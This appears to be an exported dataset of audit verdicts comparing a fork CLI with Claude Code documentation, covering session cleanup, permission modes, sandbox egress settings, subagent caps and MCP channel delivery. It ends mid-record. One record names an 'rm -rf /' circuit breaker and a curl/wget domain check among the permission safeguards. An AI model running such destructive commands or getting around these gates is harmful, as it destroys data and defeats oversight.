results.claim: A headless `-p` run persists a resumable session by default; discarding it is the opt-in.
results.quote: The run still creates a resumable session unless you pass `--no-session-persistence`.
results.ourState: Inverted default. `apps/cli/src/index.ts:788` — `if (sessionId && client?.isConnected && !args.noCleanup)` deletes the session at the end of `run`; persistence is the opt-in via `--no-cleanup` (help text at `:2051`). There is no `--no-session-persistence` flag.

verdict.why:
All three checks pass; the finding survives.

1. QUOTE — verbatim. `curl -sL https://code.claude.com/docs/en/best-practices.md` line 469 (of 610), under `### Run non-interactive mode`, reads in full: "With `claude -p \"your prompt\"`, you can run Claude non-interactively, without an interactive prompt. The run still creates a resumable session unless you pass `--no-session-persistence`. [Non-interactive mode](/docs/en/headless) is how you integrate Claude into CI pipelines, pre-commit hooks, or any automated workflow. The output formats let you parse results programmatically: plain text, JSON, or streaming JSON." Four sentences on one line; none of the later three reverses the second. Corroborated on a second page: `cli-reference.md:103` — "`--no-session-persistence` | Disable session persistence so sessions are not saved to disk and cannot be resumed. Print mode only. The `CLAUDE_CODE_SKIP_PROMPT_HISTORY` environment variable does the same in any mode". So upstream's default is persist, and discard is the opt-in, exactly as claimed. (`headless.md` does not name the flag, but documents `--resume`/`--continue` against a `-p` run's session at `:278`, which presupposes persistence.)

2. CITED STATE — confirmed, one trivial line-number slip. `apps/cli/src/index.ts:788` reads `if (sessionId && client?.isConnected && !args.noCleanup) { await client.invoke('sessions:delete', sessionId).catch(() => {}) }` inside `cleanup()`, which `cmdRun` calls on the success path (`:853`), the catch path (`:858`) and on SIGINT/SIGTERM (`:800`). `noCleanup` is parsed only from `--no-cleanup` (`:113-114`, declared `:37`, defaulted `false` at `:66`). Help text is at `:2052`, not `:2051` — off by one, immaterial. `docs/cli.md:168` documents the same inversion: "`--no-cleanup` | `false` | Skip session deletion on exit". `--no-session-persistence` and `sessionPersistence` appear nowhere in the fork's source (`grep -ran` across `packages` and `apps`, NUL-safe): the only repo hits are this sweep's own JSON under `docs/superpowers/specs/data/`.

3. ONE LAYER UP AND DOWN — consequence verified separately, and it holds.
   - UP (is `run` really the `-p` analogue?): yes, and the fork says so itself. `apps/cli/src/index.ts:616-618` comment: "`run` is our non-interactive `-p` mode, and the agent subprocess is where the wait actually happens"; `spawnLocalServer(args, { printMode: true })` at `:782` sets `PRINT_MODE_ENV_VAR`. Not a wrong-subsystem match.
   - DOWN (does the delete actually destroy resumability, or is something downstream soft-deleting?): no soft delete. `SessionManager.deleteSession` (`packages/server-core/src/sessions/SessionManager.ts:14920`) fences the persistence queue, then `if (this.sessionStore.delete(sessionKey) === false) throw new Error('session-storage-delete-failed')` at `:14950-14952` — durable storage removal, with a rollback path that re-persists only when the storage delete never committed. It also emits `session_deleted`. The CLI spawns the server with no temp config dir (`apps/cli/src/server-spawner.ts` has no `NESSY_CONFIG_DIR`/`mkdtemp`), so the session lived in the user's real store before being removed.
   - And resumption is a real capability the default throws away: `send <id> <message>` ("Send message and stream AI response", help `:2077`) plus `sessions` / `session messages <id>` continue a kept session. So `--no-cleanup` is genuinely the persistence opt-in. (Separately, the fork has no `--resume`/`--continue` on `run` at all — `grep -an 'resume' apps/cli/src/index.ts` returns nothing — which is a wider gap than this row claims, not a narrower one.)

NOT an owner decision: `docs/superpowers/specs/2026-07-29-inert-worklist.md` §3's nine dated decisions are SEATBELT_TESTING_WILDCARD, availableModels/enforceAvailableModels, autoMode.classifyAllShell, ManagedDeliveryStateV1.drops, plugins/hooks-runtime.ts, SdkMcpServerConfig.required, SessionMirrorStore.delete, MirrorSessionKey.subpath/listSubkeys, and listSessionSummaries/listSessions. None touches CLI session cleanup. NOT a deliberate product difference either: it is not a subscription flow, not gateway-scoped, and not a rename — the flag *name* differs, but a rename cannot explain an inverted *default*. `git log -L 786,792:apps/cli/src/index.ts` shows the block arrived unchanged in the baseline import commit `845cf0a4`, i.e. inherited upstream behaviour, with no recorded rationale anywhere in `docs/`.
verdict.correctedState: Confirmed as stated, with one correction: the help text is at `apps/cli/src/index.ts:2052`, not `:2051`. Full state — `cleanup()` at `apps/cli/src/index.ts:787-792` deletes the run's session unless `--no-cleanup` was passed, on every exit path (success `:853`, error `:858`, SIGINT/SIGTERM `:800`); `SessionManager.deleteSession` (`packages/server-core/src/sessions/SessionManager.ts:14950`) performs a hard durable-storage delete, so the session is genuinely unresumable afterwards even though `send <id> <message>` would otherwise continue it. `--no-cleanup` (parsed `:113-114`, documented `docs/cli.md:168` and help `:2052`) is therefore the persistence opt-in — the inverse of Claude Code, where persistence is the default and `--no-session-persistence` (`cli-reference.md:103`, print-mode only, with `CLAUDE_CODE_SKIP_PROMPT_HISTORY` as the any-mode env equivalent) is the discard opt-in. Neither `--no-session-persistence` nor any env-var equivalent exists in the fork. Related and wider: the fork's CLI has no `--resume`/`--continue` for `run` at all.

results.claim: Unattended batch invocations scope permissions with `--allowedTools` rather than running unrestricted.
results.quote: The `--allowedTools` flag restricts what Claude can do, which matters when you're running unattended.
results.ourState: No `--allowedTools`/`--allowed-tools` flag exists in `apps/cli` (`grep -an 'allowedTools' apps/cli/src/index.ts` → 0 hits), and the headless `run` command defaults to the widest mode: `apps/cli/src/index.ts:842` — `permissionMode: (args.mode ? parsePermissionMode(args.mode) ?? args.mode : undefined) || 'bypassPermissions'`. A fan-out loop therefore has no per-invocation tool scoping and starts from bypass rather than from a prompting mode.

verdict.why: Quote and cited line both check out, but the CONSEQUENCE is false — the classic 'identifier is unwired, something upstream already handled it' shape. (1) QUOTE: verbatim at best-practices.md:532, second sentence of a two-sentence line ('Refine your prompt based on what goes wrong with the first 2-3 files, then run on the full set. The `--allowedTools` flag restricts what Claude can do, which matters when you're running unattended.'); the first sentence does not reverse it. (2) CITED LINE: apps/cli/src/index.ts:842 reads exactly as claimed, and `grep -an 'allowedTools|allowed-tools'` over apps/cli/src returns 0 hits — no such flag; the 24 parsed flags are --url --token --workspace --timeout --json --tls-ca --send-timeout --source --mode --output-format --json-schema --no-cleanup --disable-spinner/--no-spinner --verbose --safe-mode --server-entry --workspace-dir --provider --model --api-key --base-url --help --version --validate-server. bypassPermissions is indeed the widest mode (PERMISSION_MODE_ORDER, mode-types.ts:63). (3) CONSEQUENCE — REFUTED. An enforced tool allowlist with exactly the semantics the sentence describes DOES exist and it outranks bypass. `checkToolPermission` (packages/shared/src/agent/mode-manager.ts) evaluates, IN THIS ORDER: deniedPaths :2094, deniedToolPatterns :2103, disallowedTools :2111, `config.allowedTools` :2119-2127 ('Tool blocked: <tool> is not included in allowedTools') and deny/ask toolRules :2129-2157 — and ONLY THEN, at :2161, does `if (mode === 'bypassPermissions') return { allowed: true }`. A non-empty allowedTools list therefore blocks every tool off it even in bypassPermissions. Those lists come from permissions.json layers that the merged config assembles (permissions-config.ts:8 'Workspace: CONFIG_DIR/workspaces/{slug}/permissions.json' and per-source; loadWorkspacePermissionsConfig :698 applied :1107, allowedTools pushed :1252), so scoping IS reachable per invocation: `--workspace <slug>` selects the workspace whose permissions.json carries the list, and `--source` scopes the enabled capability/MCP tool set per run. pre-tool-use.ts adds two more floors bypass does not skip — `requiresUserInteraction` (:1161-1169, 'even in ... bypassPermissions') and the rm -rf / circuit breaker (:1186-1200, 'unlike EVERY other gate in this file it is NOT skipped'). So 'no per-invocation tool scoping' and 'running unrestricted' are both wrong; what is actually missing is only the one-flag ergonomic. (4) PAGE SCOPE: best-practices is row 115 of docs/superpowers/specs/2026-07-31-claude-coverage-map.md, verdict ⬜ in the section 'Вне продукта — платформы, IDE, облака, онбординг' — a tips page grouped with common-workflows and champion-kit. The normative page for a CLI flag is cli-reference (row 37, 🟨), not this one. Not one of the nine §3 owner decisions in 2026-07-29-inert-worklist.md, and the bypass default is long-standing documented CLI behaviour (docs-site/content/reference/cli.md:185 '| `--mode <mode>` | `bypassPermissions` | permission mode for the session |'; line 842 only respelled `allow-all` → `bypassPermissions` in 5e8c5b76).
verdict.correctedState: apps/cli has no `--allowedTools` flag (0 hits, `grep -a`), and `nessy-general-agent run` defaults to `bypassPermissions` (apps/cli/src/index.ts:842) — both as claimed, and the default is documented at docs-site/content/reference/cli.md:185. But the consequence does not follow. An `allowedTools` allowlist with the same restricting semantics is implemented and enforced at packages/shared/src/agent/mode-manager.ts:2119-2127, ahead of the `bypassPermissions` short-circuit at :2161, alongside deniedPaths (:2094), deniedToolPatterns (:2103), disallowedTools (:2111) and deny/ask toolRules (:2129) — so a bypass run is not unrestricted. The lists live in the permissions.json layers (workspace CONFIG_DIR/workspaces/{slug}/permissions.json, per-source, global, managed), which the CLI selects per invocation with `--workspace` (and `--source` for the capability/MCP tool set, `--safe-mode` to strip skills/plugins/hooks/MCP, `--mode` to start from a prompting mode). The real, much smaller gap is ergonomic: there is no single per-run flag that sets the allowlist inline the way `claude -p --allowedTools "Edit,Bash(git commit *)"` does, so a fan-out script must pre-stage a workspace permissions.json instead.

results.quote: Added `sandbox.network.strictAllowlist` setting to deny non-allowlisted hosts for sandboxed commands without prompting
results.ourState: No reader. `grep -ran -e 'strictAllowlist' packages apps` → 0 hits; the key appears only as an unchecked task in `docs/superpowers/plans/2026-07-28-egress-proxy.md:26`. `packages/shared/src/config/sandbox-settings.ts` parses the sandbox network block without it, so a managed policy that sets it is silently dropped and the prompt path stays reachable.

The identifier absence is also real: 0 hits for strictAllowlist across packages/apps TS with grep -a, and SANDBOX_NETWORK_KEYS at packages/shared/src/config/sandbox-settings.ts:182 is exactly ['deniedDomains','allowedDomains','allowManagedDomainsOnly']. But BOTH halves of the claimed consequence are false, measured. (1) 'silently dropped' is wrong on both parse paths. Ran the real parser (parseManagedSandboxSettingsV1 with {network:{allowedDomains:['github.com'],strictAllowlist:true}}): the STRICT path used by user/project/local settings THROWS 'invalid sandbox network setting: strictAllowlist' (networkSection, :249) - loud, not silent; the TOLERANT managed path records an explicit drop {path:'sandbox.network.strictAllowlist', reason:'invalid sandbox network setting: strictAllowlist', action:'stripped'} (toleratedNetworkSection, :341-345). Whether the desktop shell surfaces managed drops at all is inert-worklist section 3 item 4, a dated owner decision about ManagedDeliveryStateV1.drops, not this key. (2) 'the prompt path stays reachable' is false because there is no per-host egress prompt path for sandboxed commands in this fork to stay reachable. resolveSandboxNetworkEnforcement (:900) reduces the whole sandbox network block to one bit, egress:'open'|'denied', and the module documents why at :846-873 (NO_DOMAIN_FILTER): Seatbelt rejects any host but * or localhost, unshare/firejail toggle the whole namespace, the Windows profile has one network.enabled boolean - 'on every backend we have, outbound network is one bit. The per-domain layer is the egress proxy (R19), deliberately parked.' With no allow/deny/PROMPT egress decision, strictAllowlist has no prompt to convert into a deny; adding a parser key would create a setting that binds nothing, which is exactly what the module's 'unenforceable' diagnostics and IsolationNetworkPostureV1 (packages/core/src/types/pi-harness-runtime.ts:50-67) exist to prevent. Sibling-subsystem trap: the only network-domain prompt in the fork is the Bash tool's curl/wget domain check (pre-tool-use.ts:1985-1997 + permission-manager.ts:475 isDomainWhitelisted), a permission-mode prompt in the tool pipeline that reads nothing from sandbox.network.* - and settings.md:431 scopes strictAllowlist to sandboxed commands only, so it would not gate that prompt even if implemented. Finally, this is not an unnoticed gap: parity-audit row 8 (2026-07-25-nessy-claude-parity-audit.md:690) records R19 as PARKED by owner decision 2026-07-28 ('nuzhno vsyo razreshit, ogranicheniya budut potom'), with egress deliberately OPENED by d214cb63 and the plan retained; docs/superpowers/plans/2026-07-28-egress-proxy.md already names strictAllowlist in its precedence chain (:53), its user/managed/CLI-only layer rule (:26, :55) and its failing-test list (:57, :98). The cited file:line is that plan's Global Constraints bullet, i.e. the finding's own evidence is the tracked plan for it. It also duplicates the better-worded phase1 sweep row under the sandboxing slug (data/2026-07-31-doc-sweep-phase1.json:395), whose ourState correctly stops at 'no reader'.
verdict.correctedState: sandbox.network.strictAllowlist has no reader: SANDBOX_NETWORK_KEYS (packages/shared/src/config/sandbox-settings.ts:182) accepts only deniedDomains, allowedDomains and allowManagedDomainsOnly. results.claim: A per-session subagent spawn cap (default 200) and a concurrent-subagent cap (default 20) bound runaway delegation.
results.quote: Added a per-session cap on subagent spawns (default 200, override with `CLAUDE_CODE_MAX_SUBAGENTS_PER_SESSION`) to stop runaway delegation loops; `/clear` resets the budget
results.ourState: Neither cap exists. `grep -ran -e 'MAX_SUBAGENTS_PER_SESSION' -e 'MAX_CONCURRENT_SUBAGENTS' packages apps` → 0 hits. The spawner bounds only depth (`DEFAULT_MAX_DEPTH = 1`) and a global concurrency semaphore (`DEFAULT_CONCURRENCY`, default 16 per packages/pi-agent-server/README.md:46) — a semaphore throttles simultaneity but never caps total spawns, so a session can spawn unboundedly many subagents in sequence.

verdict.why: Doc sentence is verbatim (changelog.md:207, Update 2.1.212, July 17 2026); the whole line is one bullet and the trailing clause ('/clear resets the budget') does not reverse it. The companion concurrent cap is also verbatim at changelog.md:101 (default 20, CLAUDE_CODE_MAX_CONCURRENT_SUBAGENTS). The grep for CLAUDE_CODE_MAX_SUBAGENTS_PER_SESSION / MAX_CONCURRENT_SUBAGENTS really does return 0 hits, and the cited packages/pi-agent-server/src/orchestrator/spawner.ts:604 really does read 'concurrency: cfg.concurrency ?? DEFAULT_CONCURRENCY'. But the CONSEQUENCE is false, and the finding stopped exactly one line short: spawner.ts:603 is 'fanout: cfg.maxFanout ?? 100'. That budget IS the per-session total-spawn cap. It is enforced at packages/server-core/src/pi-harness/child-session-service.ts:148 as 'if (children.length >= input.budgets.fanout) throw new Error("child-session-fanout-limit")' — against children.length, the parent's FULL record list, not the active subset computed one line earlier at :147. That list is append-only (the sole removal, :154, is the cancelled-start rollback), so a finished child still counts: this is a cumulative lifetime cap on spawns per parent session, exactly the documented semantic. Proven by packages/server-core/src/pi-harness/child-session-service.test.ts:174-184 — child-1 is stopped (twice) and then starting child-3 with 'fanout: 1, concurrency: 2' still throws 'child-session-fanout-limit'. So the claim's core assertion, 'a semaphore throttles simultaneity but never caps total spawns, so a session can spawn unboundedly many subagents in sequence', is refuted by a passing test. The second cap is also present and also missed: child-session-service.ts:149 'if (active.length >= input.budgets.concurrency) throw new Error("child-session-concurrency-limit")' is a per-parent CONCURRENT-subagent cap enforced on the host, in addition to (not the same as) the process-wide DEFAULT_CONCURRENCY semaphore the finding described. Shipped defaults come from DEFAULT_PI_ORCHESTRATOR_CONFIG (packages/shared/src/agent/pi-harness/harness-manifest.ts:102-112): maxAgents 1000, concurrency 16, wired maxAgents -> maxFanout -> budgets.fanout at packages/pi-agent-server/src/index.ts:1280; packages/pi-agent-server/README.md:49 documents maxAgents as the 'Runaway backstop: maximum agent() calls per workflow run'. SessionManager narrows further on specific paths (fanout: min(parentBudgets?.fanout ?? 1, 1) for hook-effect children at SessionManager.ts:4933; fanout: 1 for the judge at :11217; min-with-inherited at :11142). Finally, the absent identifiers are the expected shape of this fork, not a gap: Nessy is renamed throughout (NESSY_ prefixes, @nessy-agent scope, Pi orchestrator), so CLAUDE_CODE_* env names would not exist even where the behaviour matches — a textbook 'identically-named symbol in a sibling subsystem' inversion. Nothing in docs/superpowers/specs/2026-07-29-inert-worklist.md section 3 covers this; the refutation is on evidence, not on a recorded decision.
verdict.correctedState: Both caps exist under Pi/Nessy names, and both are enforced on the host, not in the spawner. Per-session TOTAL subagent-spawn cap: budgets.fanout, enforced cumulatively at packages/server-core/src/pi-harness/child-session-service.ts:148 against the parent's append-only child-record list (terminated children still count; regression test at child-session-service.test.ts:180-184). CONCURRENT-subagent cap: budgets.concurrency, enforced at child-session-service.ts:149 against starting|running children only, on top of the process-wide semaphore. Shipped defaults: maxAgents 1000 and concurrency 16 (packages/shared/src/agent/pi-harness/harness-manifest.ts:102-112), plumbed via configureSpawner({ maxFanout: config.orchestrator?.maxAgents, concurrency: config.orchestrator?.concurrency }) at packages/pi-agent-server/src/index.ts:1277-1280; the spawner's own fallbacks when no host config arrives are 100 and 16 (spawner.ts:603-604). The only genuine deltas are cosmetic/numeric and were not what the finding claimed: our defaults are 1000/16 against Claude's 200/20, the knobs are orchestrator config keys (orchestrator.maxAgents, orchestrator.concurrency) rather than CLAUDE_CODE_* environment overrides, and whether a conversation clear resets the accumulated fanout budget was not verified either way.

results.claim: A channel event pushed while the user is away reaches the session and Claude reacts to it; several events arriving during a busy turn are delivered together on the next turn.
results.quote: A channel is an MCP server that pushes events into your running Claude Code session, so Claude can react to things that happen while you're not at the terminal.
results.ourState: An event arriving while the session is IDLE is silently discarded. `packages/server-core/src/sessions/SessionManager.ts:2436` subscribes with `({ text }) => { ...; canDeliver()?.redirect(text) }`, and `canDeliver()` at `:2399-2405` returns `undefined` unless `managed.isProcessing && agent.isProcessing?.()`. There is no queue and no idle wake for this path: the R3 grouping/idle-wake delivery that DOES cite this contract (`packages/server-core/src/sessions/task-notification.ts:46-51`, "delivered together on the next turn ... one delivery, in arrival order") is wired to monitor events only, never to `subscribeChannel`. Events during a busy turn are also not grouped — each is steered in immediately.

verdict.why:
All three checks pass and no refutation ground applies.

(1) DOC, verbatim. `curl -sL https://code.claude.com/docs/en/channels.md` line 13 carries the quoted sentence exactly. The whole line is three sentences and the remainder does NOT reverse it: "Channels can be two-way: Claude reads the event and replies back through the same channel, like a chat bridge. Events only arrive while the session is open, so for an always-on setup you run Claude in a background process or persistent terminal." The only stated precondition is that the SESSION IS OPEN — not that a turn is in flight. The grouping half of the claimed behaviour is not on this page but is verbatim on `channels-reference.md:256`: "Events queue into the session and are processed in order. If several notifications arrive while Claude is busy, they're delivered together on the next turn and Claude handles them as a group."

(2) CODE, as cited. `packages/server-core/src/sessions/SessionManager.ts:2436` is `managed.mcpChannelUnsubscribe = pool.subscribeChannel(leaserId, ({ text }) => { if (managed.mcpLeaserId !== leaserId) return; canDeliver()?.redirect(text) })`, and `canDeliver` at `:2399-2405` is `if (current !== managed || !agent || !managed.isProcessing || !agent.isProcessing?.()) return undefined` plus a capability-generation check. Exactly as claimed, line numbers included. (Nit, non-material: the `task-notification.ts` docblock the finding quotes is at `:47-52`, not `:46-51`; the quoted text is present.)

(3) CONSEQUENCE, verified separately from the identifier, and it is not an upstream-handled or sibling-subsystem confusion. There is no queue below: `mcp-pool.ts:714 subscribeChannel` only adds a listener, `:758 applyChannelPolicy` installs a pass-through dispatcher, nothing buffers. There is no idle wake above: `deliverMonitorEvent`/`flushPendingTaskNotifications` (`SessionManager.ts:2660`, `:2677`) — the R3 three-rule discipline whose docblock at `:2649-2651` literally says the other out-of-turn producer `armPiPluginPeripherals` "can only steer a LIVE turn, so an event arriving between turns was dropped outright" — has exactly three producers: `SessionMonitorService` (`:3603`), the cron service (`:2749`) and R10 `task_notification` (`:18240`). `subscribeChannel` is not among them. The repo's own shipped test asserts the drop as intended-for-now: `packages/server-core/src/sessions/__tests__/mcp-channel-gate.test.ts:90-106`, "still drops a push when no turn is in flight", with an enabled policy and an idle session expecting `redirected` to be `[]`. Grouping is likewise absent on this path — each event is `redirect(text)`-ed individually into the running turn.

Not an owner decision. `docs/superpowers/specs/2026-07-29-inert-worklist.md` §3 lists nine dated decisions; none is this. The only channel row there is `isManagedChannelServerAllowed` under "cosmetic", a different symbol with a different (refuted) consequence. What the repo does record is the OPPOSITE of a keep-decision: `docs/superpowers/plans/2026-07-26-sandbox-and-managed-policy.md:104-106` scopes it out of P10 only — "Today a push is dropped when no turn is in flight. That drop is the only thing making the current no-gate state survivable. Do not touch it in this plan" — and the parity audit at `2026-07-25-nessy-claude-parity-audit.md:1167` says "The no-turn drop is the invariant a later feature will want to remove." Scoped out of one plan pending the security gate is not the same as decided-to-keep.

Not a deliberate product difference either. The fork did not drop channels the way it drops Claude/ChatGPT subscription flows: the channel push path is implemented generically for any MCP server (`mcpChannelPushEnabled` + `resolveManagedChannelPolicy`, `channelsEnabled`/`allowedChannelServers`), and the coverage map already grades the page 🟨 "код есть (10 файлов, 4 с тестами)". The divergence is in delivery semantics of a feature we do ship, not in its absence.
verdict.correctedState: CONFIRMED as written, with two clarifications. (a) The idle-drop half of the claim is what `channels.md:13` supports; the grouping half is contracted by `channels-reference.md:256`, not by the quoted page. (b) On a stock install nothing is delivered at all regardless: `getMcpChannelPushEnabled()` (`packages/shared/src/config/storage.ts:1149-1155`) defaults to `false`, so the dispatcher is never installed — that default is P10's deliberate security gate and is NOT part of this finding. The finding is about behaviour once the switch is on: with channel push enabled and the source permitted, `SessionManager.ts:2436`'s listener calls `canDeliver()?.redirect(text)`, and `canDeliver()` (`:2399-2405`) returns `undefined` unless BOTH `managed.isProcessing` and `agent.isProcessing?.()` hold. An event arriving between turns is therefore discarded with no queue, no idle wake and no error to the pushing server, and several events arriving during a live turn are each steered in individually rather than grouped. The R3 grouping/idle-wake machinery that cites this exact contract (`deliverMonitorEvent` at `SessionManager.ts:2660`, `flushPendingTaskNotifications` at `:2677`, `task-notification.ts:47-52`) exists and works, but is fed only by `SessionMonitorService`, the cron service and R10 detached-MCP results — never by `pool.subscribeChannel`. The repo's own test `__tests__/mcp-channel-gate.test.ts:90-106` pins the drop, and both `2026-07-26-sandbox-and-managed-policy.md:104-106` and the parity audit `:1167` record it as a known open invariant a later feature is expected to remove — an acknowledged gap, not a settled decision.

verdict.why: All three checks confirm the finding. (1) The quoted sentence exists verbatim: channels-reference.md line 225 is exactly 'Your server emits `notifications/claude/channel` with two params:' — a one-sentence line, followed by a table whose rows are `content` (string, 'The event body') and `meta` (Record<string,string>, optional, becomes attributes on the <channel> tag). Line 48 ('Emit `notifications/claude/channel` events when something happens') and line 221 ('call `mcp.notification()` with method `notifications/claude/channel`') say the same thing; the page uses the un-prefixed string `claude/channel` only as the CAPABILITY key (`capabilities.experimental: { 'claude/channel': {} }`, line ~101). The page is a legitimate Claude contract source: it is row 67 of scripts/claude-doc-pages.tsv. (2) The cited code says what was claimed: packages/shared/src/mcp/client.ts:112-114 is `const ClaudeChannelNotificationSchema = NotificationSchema.extend({ method: z.literal('claude/channel') })` and :357-361 is `setNotificationHandler(ClaudeChannelNotificationSchema, notification => { const text = (notification.params as { text?: unknown } | undefined)?.text; ... })`. `grep -ran 'notifications/claude' packages apps scripts` (with -a, NUL-safe) returns 0 hits; the only repo hits are the sweep documents themselves in docs/. Every other notification this same client registers carries the prefix (ToolListChangedNotificationSchema = 'notifications/tools/list_changed'), which is what makes the un-prefixed literal a rename-class miss rather than a style choice. (3) The CONSEQUENCE was verified separately from the identifier, both one layer up and one layer down. Down: MCP SDK dispatch keys on the exact method string — protocol.js:274 `this._notificationHandlers.get(notification.method) ?? this.fallbackNotificationHandler`, with `if (handler === undefined) return;` under the comment 'Ignore notifications not being subscribed to'; setNotificationHandler registers under `getMethodLiteral(schema)`. No `fallbackNotificationHandler` is set anywhere in packages/ or apps/, and the custom SupervisedStdioClientTransport (client.ts:820-840) deserializes and forwards frames unmodified — there is no compat shim rewriting the method. So a conforming server's notification is dropped with no error, exactly as claimed. Up: the consumer chain is McpChannelMessage { server, text } -> NessyMcpClient.channelHandler -> McpClientPool.dispatchChannelMessage (mcp-pool.ts:1082) guarded by isMcpChannelMessage (:370, requires `message.text` to be a string) -> SessionManager channel listener; nothing anywhere reads `content` or `meta`, so even a server that used the un-prefixed method would still be ignored unless it sent `text`. Not an owner decision: inert-worklist.md section 3's nine dated decisions contain no channel-method row (its only channel item is `isManagedChannelServerAllowed`, a different symbol in the managed-policy subsystem, listed in section 4 as a consequence-false false positive). Not a deliberate product difference either — this is a wire method on the MCP protocol, not a NESSY_ rebrand surface, and the code already names it `claude/channel`; the feature is explicitly modeled on Claude channels (storage.ts:1142 'Whether a connected MCP server may push text into a live turn through the `claude/channel` notification'). The parity audit already grades this area 'partial' rather than parity (2026-07-25 audit line 1764). Two bounding caveats that do not refute it: channel push is fail-closed (`mcpChannelPushEnabled` defaults false, CHANNEL_PUSH_OFF), so no user is affected until they opt in; and the claim's own line 'grep returns zero hits repo-wide' is now true only for source — docs/ quotes the string.
verdict.correctedState: Confirmed. packages/shared/src/mcp/client.ts:112-114 registers the channel notification under the literal method `claude/channel`, which is Claude's CAPABILITY key (`capabilities.experimental['claude/channel']`), not its notification method — the documented method is `notifications/claude/channel` (channels-reference.md:225, also :48 and :221). The handler at :357-361 then reads `params.text`, while the documented params are `content` (string) and optional `meta` (Record<string,string>). Because @modelcontextprotocol/sdk dispatches notifications by exact method string (protocol.js:273-277) and this client sets no fallbackNotificationHandler and does not rewrite frames in SupervisedStdioClientTransport, a channel server written to Claude's contract has every event silently discarded. `meta` is unsupported at the type level too: McpChannelMessage (client.ts:102-105) carries only { server, text }, and isMcpChannelMessage (mcp-pool.ts:370) requires `text`. Exposure is bounded — mcpChannelPushEnabled defaults to false, so no dispatcher is installed until a user opts in — but the mismatch means the feature cannot work with any conforming channel plugin. Fix is to accept `notifications/claude/channel` with `content`/`meta` (keeping `claude/channel`/`text` as a read-path alias if any in-house server already emits it), and to plumb `meta` through to the <channel> tag attributes, which is the separate phase1 row 22.

results.ourState: No wrapping at all. The pool does carry the server slug (`packages/shared/src/mcp/client.ts:102-105`, `McpChannelMessage { server, text }`), but the consumer throws it away: `packages/server-core/src/sessions/SessionManager.ts:2436` destructures `({ text })` and calls `canDeliver()?.redirect(text)`, which reaches `PiAgent.redirect` (`packages/shared/src/agent/pi-agent.ts:7086-7095`) and is sent verbatim as a `steer` message. The model cannot tell which channel an event came from, and there is no attribute channel for routing keys like `chat_id` — which makes the documented two-way reply pattern ("passing the chat_id from the tag") unimplementable against us.

verdict.why: All three checks pass; the claim survives. (1) QUOTE VERBATIM. `curl -sL https://code.claude.com/docs/en/channels-reference.md` line 244 reads exactly: "The event arrives in Claude's context wrapped in a `<channel>` tag. The `source` attribute is set automatically from your server's configured name:" Both sentences on that line support the claim; the second half does not reverse it. The immediately following fenced block (`:246-250`) shows `<channel source="your-channel" severity="high" run_id="1234">` with the body inline, and the `meta` row of the notification-format table (`:229`) says "Each entry becomes an attribute on the `<channel>` tag for routing context like chat ID, sender name, or alert severity." The two-way pattern the claim invokes is also verbatim on the page (`:322`, `:350`, `:619`): "Reply with the reply tool, passing the chat_id from the tag." The page is row 67 of `scripts/claude-doc-pages.tsv`, so it is a legitimate Claude Code contract source. (2) CITED SITE CONFIRMED. `packages/server-core/src/sessions/SessionManager.ts:2436-2439` is verbatim `managed.mcpChannelUnsubscribe = pool.subscribeChannel(leaserId, ({ text }) => { if (managed.mcpLeaserId !== leaserId) return; canDeliver()?.redirect(text) })` — the destructure drops `server`, exactly as claimed. (3) ONE LAYER UP AND DOWN, CONSEQUENCE VERIFIED SEPARATELY. Up: `packages/shared/src/mcp/mcp-pool.ts:1082-1105` (`dispatchChannelMessage`) hands listeners the whole `{ server, text }`, so the slug is available and it is the consumer that discards it — nothing upstream has already wrapped. Further up, `packages/shared/src/mcp/client.ts:357-361` builds the message from `(notification.params as { text?: unknown }).text` only; `meta` is never read, so the attribute payload never even enters the process — the 'no attribute channel for chat_id' half of the claim is true at the source, not merely at the consumer. Positive control for the absence claim: `grep -rna '<channel' packages apps --include='*.ts' --include='*.tsx'` returns only four unrelated CLI usage strings (`apps/cli/src/index.ts:918,940,2079,2080`); `-a` was used because this repo has NUL-carrying files. The only `source="..."` tag builders in the tree are `source-manager.ts:250` (`<source_issue>`) and `guardian.ts:296` (`<untrusted source=...>`), and the latter is reachable only from the auto-mode guardian prompt (`guardian.ts:312`, `:394`), never from the steer path — so the sibling-subsystem mirror does not apply. NOT AN OWNER DECISION: the nine dated decisions in `2026-07-29-inert-worklist.md` §3 are the seatbelt wildcard, `availableModels`/`enforceAvailableModels`, `autoMode.classifyAllShell`, `ManagedDeliveryStateV1.drops`, `plugins/hooks-runtime.ts`, `SdkMcpServerConfig.required`, `SessionMirrorStore.delete`, `MirrorSessionKey.subpath`, and `listSessionSummaries` — none touches channel rendering. NOT A DELIBERATE PRODUCT DIFFERENCE: channels are implemented here (the `claude/channel` handler, `ChannelPolicy`, `allowedSources`, the `channelsEnabled` managed key), and the parity audit itself records the surface as knowingly incomplete — `2026-07-25-nessy-claude-parity-audit.md:1764` §6.5 "`claude/channel`, `parity` vs `partial` — **partial**" — which is an acknowledged gap, not a refutation. Two notes that do not change the verdict: (a) the claim's line range for `PiAgent.redirect` has drifted — the override is at `packages/shared/src/agent/pi-agent.ts:7109`, not `:7086-7095`, which now falls inside `forceAbort`; the named symbol and its behaviour are correct. (b) This finding overlaps f135 (method `claude/channel` vs the documented `notifications/claude/channel`, and `params.text` vs `content`/`meta`) but is not subsumed by it: even if the method matched, nothing in the chain would build the tag.
verdict.correctedState: Confirmed, with one corrected line reference and one added upstream cause. Nothing in the repo ever builds a `<channel>` element: `grep -rna '<channel' packages apps` over .ts/.tsx yields only unrelated CLI usage strings. The event text is delivered to the model raw. Chain: `packages/shared/src/mcp/client.ts:357-361` constructs `{ server: this.channelServer, text: boundedChannelText(text) }` from `params.text` alone — `meta` is never read, so the per-key attributes the page specifies (`channels-reference.md:229`) never enter the process at all; `packages/shared/src/mcp/mcp-pool.ts:1082-1105` dispatches that full message to subscribers, so the slug is intact at the seam; `packages/server-core/src/sessions/SessionManager.ts:2436` destructures `({ text })`, discarding `server`; `PiAgent.redirect` at `packages/shared/src/agent/pi-agent.ts:7109` (NOT :7086-7095, which is `forceAbort`) sends `{ type: 'steer', message }`; `packages/pi-agent-server/src/index.ts:4329-4333` passes it to `piSession.steer(msg.message)` unchanged. Second, the 'channel plugin' framing names an already-recorded deferral rather than a new gap: a plugin's channels field is a deliberately retained-but-deferred surface (packages/shared/src/plugins/format-adapters/claude.ts:2271, { externalKind: 'channel', field: 'channels' } -> reasonCode plugin.deferred.claude_channel), and the deviation register already records it ('channels are still a wholly deferred surface here', 2026-07-29-deviation-register.md:264), which is the one deviation the coverage map counts for this page (2026-07-31-claude-coverage-map.md:127). verdict.correctedState: The permission-relay half is genuinely absent: no source file mentions channel/permission or any 